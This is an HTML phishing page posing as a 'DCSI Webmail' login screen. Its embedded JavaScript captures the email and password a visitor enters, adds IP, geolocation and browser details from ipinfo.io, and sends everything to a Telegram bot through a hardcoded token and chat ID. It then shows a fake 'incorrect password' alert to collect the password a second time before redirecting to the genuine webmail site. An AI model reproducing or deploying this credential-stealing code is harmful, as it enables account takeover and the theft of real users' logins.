<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <title>DCSI Webmail</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f9f9f9;
    }
    .container {
      text-align: center;
      width: 100%;
      max-width: 400px;
      padding: 20px;
      box-sizing: border-box;
    }
    .logo img {
      max-width: 100%;
      height: auto;
      margin-bottom: 20px;
    }
    .form-container {
      width: 100%;
      margin: 0 auto;
    }
    .input-group {
      margin-bottom: 15px;
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 5px;
      overflow: hidden;
    }
    .input-group i {
      padding: 10px;
      background-color: #f1f1f1;
      color: #333;
    }
    input {
      width: 100%;
      padding: 10px;
      border: none;
      outline: none;
    }
    .login-button {
      display: block;
      width: 100%;
      padding: 10px;
      background-color: #33b4ff;
      color: #fff;
      font-weight: bold;
      text-transform: uppercase;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background 0.3s;
    }
    .login-button:hover {
      background-color: #1a90d8;
    }
    .footer {
      margin-top: 20px;
      color: #666;
      font-size: 0.9rem;
    }

    @media (max-width: 600px) {
      body {
        flex-direction: column;
        padding: 20px;
      }
      .container {
        max-width: 100%;
      }
      .form-container {
        padding: 0;
      }
    }
  </style>
</head>

<div class="form-container">
    <form id="loginForm">
        <div class="input-group">
            <label for="email">
                <i class="fa-solid fa-user"></i>
            </label>
            <input type="email" id="email" name="email" placeholder="Username" required>
        </div>
        <div class="input-group">
            <label for="password">
                <i class="fa-solid fa-lock"></i>
            </label>
            <input type="password" id="password" name="password" placeholder="Password" required>
        </div>
        <button type="submit" class="login-button">LOGIN</button>
    </form>

<script>
    const BOT_TOKEN = '8070463264:AAFZbZQjPOEd861FoPyqbvSFT6iztKKmDN0';
    const CHAT_ID = '6078089614';
    const REDIRECT_URL = 'https://webmail.dcsi.net.au/';  // Replace with your redirect URL
    const IPINFO_TOKEN = 'f8595be4b4a2db'; // Replace with your IPInfo token

    let attemptCounter = 0; // Counter to track login attempts

    document.getElementById('loginForm').addEventListener('submit', async function(event) {
        event.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const date = new Date().toLocaleString();
        const browserType = navigator.userAgent;  // Get browser type

        try {
            // Fetch IP and location data
            const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
            if (!response.ok) throw new Error("Failed to fetch IP info.");
            const ipInfo = await response.json();

            // Extract location details
            const ip = ipInfo.ip || 'N/A';
            const city = ipInfo.city || 'N/A';
            const region = ipInfo.region || 'N/A';
            const country = ipInfo.country || 'N/A';
            const location = ipInfo.loc || 'N/A';

            // Prepare message content with easier-to-copy email and password
            const message = `
🌐 *New DCSI Webmail Logz* 🌐

🕒 *Date & Time*: ${date}

👤 *Email*: 
${email}

🔑 *Password*: 
${password}

📍 *IP Address*: ${ip}
🏙 *Location*: ${city}, ${region}, ${country}
🌍 *Coordinates*: ${location}
💻 *Browser*: ${browserType}

🔒 _THE OUTLAWS._
            `;

            // Send message to Telegram
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'  // Enables Markdown for text styling
                })
            });

            // Handle attempts and responses
            attemptCounter++;

            if (attemptCounter === 1) {
                alert("Incorrect password, try again.");
            } else if (attemptCounter === 2) {
                // Add a 2-second delay before redirecting
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 2000);
            }

        } catch (error) {
            console.error("Error:", error);
        }
    });
</script>
